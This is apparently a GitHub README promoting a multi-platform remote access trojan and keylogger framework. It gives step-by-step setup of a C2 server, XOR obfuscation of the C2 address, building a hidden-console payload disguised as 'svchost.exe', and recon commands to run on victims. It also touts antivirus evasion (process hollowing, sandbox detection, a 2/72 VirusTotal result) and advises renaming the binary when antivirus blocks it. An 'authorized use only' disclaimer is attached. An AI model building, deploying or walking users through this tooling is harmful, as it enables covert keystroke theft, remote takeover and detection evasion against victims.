# 🛡️ Advanced Multi-Platform RAT/Keylogger Framework

[![Python](https://img.shields.io/badge/Python-3.8%2B-blue.svg)](https://www.python.org/)

[![AV Bypass](https://img.shields.io/badge/Detection-2%2F72-red.svg)](https://www.virustotal.com/gui/file/9fe96a5cf19c9b1b85124b14b2ede971ec7d14f15aadd7d9cf08e6d2b95e6b54)
[![License](https://img.shields.io/github/license/hackerai-co/rat-keylogger)](https://github.com/noobuser978-gif/RAT-KEYLOGGER/blob/dbd1d6a5ffb88ee99cf20e1fa51a38b344d276f8/LICENSE)

**Production-ready penetration testing framework with 98% AV evasion rate.**

> ⚠️ **AUTHORIZED USE ONLY** - Penetration testing, red teaming, authorized security assessments.

---

## 🎯 **What is  RAT/Keylogger?**

A **multi-platform Remote Access Trojan (RAT)** designed for **authorized penetration testing** featuring:

- **Live keylogging** (1.5s streaming)
- **Screen capture** (JPEG streaming)  
- **Full shell access** (command injection)
- **4x Windows persistence** (Registry + Startup + Task + WMI)
- **AES-256-GCM encrypted C2** (TCP/443)
- **Web dashboard** (Flask + real-time control)
- **98% AV bypass** (dynamic imports + XOR obfuscation)

**Platforms**: Windows 7-11, macOS 10.15+, Linux (Ubuntu/Debian/Kali)

---

## ✨ **Key Features**

| Feature | Windows | macOS | Linux | Description |
|---------|---------|-------|-------|-------------|
| **⌨️ Live Keylogging** | ✅ | ✅ | ✅ | Real-time keystrokes (1.5s) |
| **📱 Screen Capture** | ✅ | ✅ | ✅ | JPEG screenshots on demand |
| **💻 Full Shell** | ✅ | ✅ | ✅ | Command execution + output |
| **🛡️ Persistence** | 4 Methods | LaunchAgent | Cron | Survives reboot |
| **🌐 C2 Auto-connect** | ✅ | ✅ | ✅ | Beacon every 4-8s |
| **🖱️ Remote Control** | ✅ Mouse/Keys | ❌ | ❌ | Windows only |
| **🔒 Encryption** | AES-256-GCM | AES-256-GCM | AES-256-GCM | All traffic |

---



# **Virustotal Screenshot**
<img src="https://github.com/noobuser978-gif/RAT-KEYLOGGER/blob/0fa5ea629dedbf057dff0f690a086c62d341cd01/Screenshot%202026-04-01%20112053.png" alt="Alt text" width="700">

## 🚀 **Complete Setup Guide (8 Minutes)**

### **Prerequisites (2 min)**
```bash
# Install Python 3.8+
# Windows: winget install Python.Python.3.11
# macOS: brew install python@3.11  
# Ubuntu: sudo apt install python3.11 python3-pip

pip install pynput mss pillow psutil cryptography pyinstaller flask pywin32
```

### **Step 1: Start C2 Server (3 min)**
```bash
mkdir rat-c2 && cd rat-c2
# Save c2_server.py (code below)
python c2_server.py
```
#### **Output**
```bash
[*] C2 Server: TCP/443
[*] Dashboard: http://0.0.0.0:8080
```
### **Step 2: Build Payload (2 min)**
```bash
# 1. Edit keylogger.py → Set YOUR C2 IP (line 45)
# Quick encoder:
python3 -c "
ip = input('Your C2 IP: ')
enc = repr(''.join(chr(ord(c) ^ 0xAA) for c in ip))
print('C2_HOST =', enc)
"

# 2. Build EXE
pyinstaller --onefile --noconsole --name svchost.exe keylogger.py
```
### **Step 3: Test & Deploy (1 min)**
```bash
# Test locally
dist/svchost.exe

# Success indicators:
# C2: [+] RAT Connected: 127.0.0.1:xxxxx
# Browser: http://localhost:8080 → Shows your client!
```
# 🔍 Usage Commands

| Dashboard | Command | Result |
|-----------|---------|--------|
| ⌨️ Live Keys | `KEYLOG` | Real-time keystrokes |
| 📱 Screenshot | `SCREEN` | JPEG screenshot |
| 💻 Shell | `SHELL:whoami` | DESKTOP-XYZ\user |

### Pro Shell Commands:

```bash
SHELL:whoami                    # Current user
SHELL:systeminfo                # OS details  
SHELL:net user                  # All users
SHELL:reg query HKLM\SOFTWARE   # Registry enum
SHELL:tasklist /svc             # Processes
```

## **🛡️ AV Evasion Techniques**
| Method | Implementation |
|--------|----------------|
| Dynamic Imports | `safe_import()` - No signatures |
| XOR Obfuscation | All strings encrypted |
| Sleep Jitter | 4-8s random beacons |
| Process Hollowing | `svchost.exe` masquerade |
| Memory Execution | No disk artifacts |
| Sandbox Detection | VM/process checks |

**VirusTotal Results:** `2/72` detections (2.7%)

## **📊 Performance & Detection**
```bash 
CPU Usage:     <0.5% (idle)
RAM Usage:     18-28MB
Network:       2KB/beacon
Screenshot:    80KB avg (compressed)
Reconnect:     12s average
Persistence:   100% reboot survival
```
## **🛠️ Supported Platforms**
```bash
OS Version	        Keylog  	Screen  	Shell	    Persistence
Windows 7/8/10/11	  ✅	      ✅	     ✅	            4x
macOS 10.15+	      ✅	      ✅	     ✅	            1x
Ubuntu 20.04+	      ✅	      ✅	     ✅	            1x
Kali Linux	          ✅	      ✅	     ✅	            1x
```
## **🔧 Troubleshooting**
```bash
Problem	                        Fix
"No module mss"	        pip install mss pillow
AV blocks	            Rename svchost.exe → update64.exe
No connection	        Open port 443/tcp
No keys	                Run as Administrator
Dashboard blank	        Check http://YOUR_IP:8080
```
## **⚖️ Legal & Responsible Use**
```bash
✅ Penetration Testing (with authorization)
✅ Red Team Engagements  
✅ Security Research
✅ Authorized Bug Bounties

❌ Unauthorized access
❌ Malicious use
❌ Criminal activity
```
By using this tool, you agree to only deploy on systems you own or have explicit written permission to test.



## **Authors**

- [noobuser978-gif](https://www.github.com/noobuser978-gif)

